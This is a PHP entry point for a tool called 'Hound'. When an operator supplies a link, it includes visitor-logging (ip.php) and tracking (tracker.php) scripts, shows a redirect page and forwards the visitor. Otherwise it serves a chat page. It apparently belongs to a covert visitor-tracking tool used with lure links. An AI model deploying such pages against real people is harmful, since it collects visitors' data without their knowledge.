<?php
/**
 * Hound entry point (v0.3).
 *
 * HOUND_TARGET_URL is set by hound.sh when the operator gives a link:
 *   - set   -> log the visitor, show the redirect page, then forward to it
 *   - empty -> classic built-in Hound chat page
 */

include __DIR__ . '/ip.php';

$target = getenv('HOUND_TARGET_URL');

if ($target !== false && trim($target) !== '') {
    include __DIR__ . '/tracker.php';
    exit;
}

header('Location: index.html');
exit;
